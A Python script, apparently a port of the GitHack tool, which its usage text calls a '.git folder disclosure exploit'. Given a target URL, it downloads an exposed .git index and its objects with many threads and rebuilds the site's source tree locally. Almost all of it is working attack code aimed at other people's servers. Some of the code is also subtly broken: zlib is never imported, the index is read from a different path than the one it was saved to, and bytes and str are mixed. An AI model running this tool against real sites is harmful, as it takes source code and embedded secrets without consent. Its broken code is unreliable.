#!/usr/bin/env python

from urllib.parse import urlparse
import threading
import collections
import binascii
import requests
import struct
import queue
import time
import ssl
import sys
import os
import re

def check(boolean, message):
    if not boolean:
        print("error: " + message)
        exit(1)

def parse(filename, pretty=True):
    with open(filename, "rb") as f:
        # f = mmap.mmap(o.fileno(), 0, access=mmap.ACCESS_READ)

        def read(format):
            # "All binary numbers are in network byte order."
            # Hence "!" = network order, big endian
            format = "! " + format
            bytes = f.read(struct.calcsize(format))
            return struct.unpack(format, bytes)[0]

        index = collections.OrderedDict()

        # 4-byte signature, b"DIRC"
        index["signature"] = f.read(4).decode("ascii")
        check(index["signature"] == "DIRC", "Not a Git index file")

        # 4-byte version number
        index["version"] = read("I")
        check(index["version"] in {2, 3},
            "Unsupported version: %s" % index["version"])

        # 32-bit number of index entries, i.e. 4-byte
        index["entries"] = read("I")

        yield index

        for n in range(index["entries"]):
            entry = collections.OrderedDict()

            entry["entry"] = n + 1

            entry["ctime_seconds"] = read("I")
            entry["ctime_nanoseconds"] = read("I")
            if pretty:
                entry["ctime"] = entry["ctime_seconds"]
                entry["ctime"] += entry["ctime_nanoseconds"] / 1000000000
                del entry["ctime_seconds"]
                del entry["ctime_nanoseconds"]

            entry["mtime_seconds"] = read("I")
            entry["mtime_nanoseconds"] = read("I")
            if pretty:
                entry["mtime"] = entry["mtime_seconds"]
                entry["mtime"] += entry["mtime_nanoseconds"] / 1000000000
                del entry["mtime_seconds"]
                del entry["mtime_nanoseconds"]

            entry["dev"] = read("I")
            entry["ino"] = read("I")

            # 4-bit object type, 3-bit unused, 9-bit unix permission
            entry["mode"] = read("I")
            if pretty:
                entry["mode"] = "%06o" % entry["mode"]

            entry["uid"] = read("I")
            entry["gid"] = read("I")
            entry["size"] = read("I")

            entry["sha1"] = binascii.hexlify(f.read(20)).decode("ascii")
            entry["flags"] = read("H")

            # 1-bit assume-valid
            entry["assume-valid"] = bool(entry["flags"] & (0b10000000 << 8))
            # 1-bit extended, must be 0 in version 2
            entry["extended"] = bool(entry["flags"] & (0b01000000 << 8))
            # 2-bit stage (?)
            stage_one = bool(entry["flags"] & (0b00100000 << 8))
            stage_two = bool(entry["flags"] & (0b00010000 << 8))
            entry["stage"] = stage_one, stage_two
            # 12-bit name length, if the length is less than 0xFFF (else, 0xFFF)
            namelen = entry["flags"] & 0xFFF

            # 62 bytes so far
            entrylen = 62

            if entry["extended"] and (index["version"] == 3):
                entry["extra-flags"] = read("H")
                # 1-bit reserved
                entry["reserved"] = bool(entry["extra-flags"] & (0b10000000 << 8))
                # 1-bit skip-worktree
                entry["skip-worktree"] = bool(entry["extra-flags"] & (0b01000000 << 8))
                # 1-bit intent-to-add
                entry["intent-to-add"] = bool(entry["extra-flags"] & (0b00100000 << 8))
                # 13-bits unused
                # used = entry["extra-flags"] & (0b11100000 << 8)
                # check(not used, "Expected unused bits in extra-flags")
                entrylen += 2

            if namelen < 0xFFF:
                entry["name"] = f.read(namelen).decode("utf-8", "replace")
                entrylen += namelen
            else:
                # Do it the hard way
                name = []
                while True:
                    byte = f.read(1)
                    if byte == "\x00":
                        break
                    name.append(byte)
                entry["name"] = b"".join(name).decode("utf-8", "replace")
                entrylen += 1

            padlen = (8 - (entrylen % 8)) or 8
            nuls = f.read(padlen)
            check(set(nuls) == set([0]), "padding contained non-NUL")

            yield entry

        f.close()

class Scanner(object):
    def __init__(self):
        self.base_url = sys.argv[-1]

        self.domain = urlparse(sys.argv[-1]).netloc.replace(':', '_')
        if not os.path.exists(self.domain):
            os.mkdir(self.domain)

        print('[+] Download and parse index file ...')
        data = self._request_data(sys.argv[-1] + '/index')
        with open('%s/index' % self.domain, 'wb') as f:
            f.write(data)
        self.queue = queue.Queue()
        for entry in parse('index'):
            if "sha1" in entry.keys():
                self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
                try:
                    print(entry['name'])
                except Exception as e:
                    pass
        self.lock = threading.Lock()
        self.thread_count = 20
        self.STOP_ME = False

    @staticmethod
    def _request_data(url):
        print(url)
        res = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        if res.status_code != 200:
            raise Exception("Server returned: %d %s" % (res.status_code, res.reason))

        return res.content

    def _print(self, msg):
        self.lock.acquire()
        try:
            print(msg)
        except Exception as e:
            pass
        self.lock.release()

    def get_back_file(self):

        while not self.STOP_ME:

            try:
                sha1, file_name = self.queue.get(timeout=0.5)
            except Exception as e:
                break

            try:
                folder = '/objects/%s/' % sha1[:2]
                data = self._request_data(self.base_url + folder + sha1[2:])
                try:
                    data = zlib.decompress(data)
                    data = re.sub(r'blob \d+\00', '', data)
                except:
                    # self._print('[Error] Fail to decompress %s' % file_name)
                    pass

                target_dir = os.path.join(self.domain, os.path.dirname(file_name))
                if target_dir and not os.path.exists(target_dir):
                    os.makedirs(target_dir)
                with open(os.path.join(self.domain, file_name), 'wb') as f:
                    f.write(data)
                self._print('[OK] %s' % file_name)
            except Exception as e:
                self._print('[Error] %s' % str(e))

        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def scan(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.get_back_file)
            t.start()


if __name__ == '__main__':
    context = ssl._create_unverified_context()
    if len(sys.argv) == 1:
        msg = """
    A `.git` folder disclosure exploit. By LiJieJie

    Usage: GitHack.py http://www.target.com/.git/

    bug-report: my[at]lijiejie.com (http://www.lijiejie.com)
    """
        print(msg)
        exit()

    s = Scanner()
    s.scan()
    try:
        while s.thread_count > 0:
            time.sleep(0.1)
    except KeyboardInterrupt as e:
        s.STOP_ME = True
        time.sleep(1.0)
        print('User Aborted.')
